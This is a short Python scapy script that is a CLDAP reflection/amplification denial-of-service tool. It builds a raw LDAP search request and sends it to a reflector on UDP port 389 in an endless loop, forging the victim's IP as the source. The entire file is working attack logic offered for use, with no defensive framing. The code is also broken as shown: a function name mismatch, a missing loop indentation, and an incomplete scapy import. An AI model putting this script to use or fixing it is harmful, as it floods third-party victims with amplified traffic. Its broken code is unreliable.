import scapy

VICTIM_IP = ""
REFLECTOR_IP = ""

def make_this_payload():
	header = "\x30\x84\x00\x00\x00\x2d"
	messageID = "\x02\x01\x07"
	protocolOp = "\x63\x84\x00\x00\x00\x50"
	baseObject = "\x04\x00"
	scope = "\x0a\x01\x00"
	dereferAliases = "\x0a\x01\x00"
	sizeLimit = "\x02\x01\x00"
	timeLimit = "\x02\x01\x64"
	typesOnly = "\x01\x01\x00"
	filtertag = "\x87"
	filterlenght = "\x0b"
	filtervalue = "\x6f\x62\x6a\x65\x63\x74\x43\x6c\x61\x73\x73"
	attributestag = "\x30\x84"
	attributeslenght = "\x00\x00\x00\x00"
	baseObject = header + messageID + protocolOp + baseObject + scope + dereferAliases \
	+ sizeLimit + timeLimit + typesOnly + filtertag + filterlenght + filtervalue + attributestag + attributeslenght
	
	return baseObject

def main():
	while(True):
	send(IP(src=VICTIM_IP,dst=REFLECTOR_IP)/UDP(sport=389,dport=389)/
	Raw(load=make_this_fuckin_payload()))
	
main()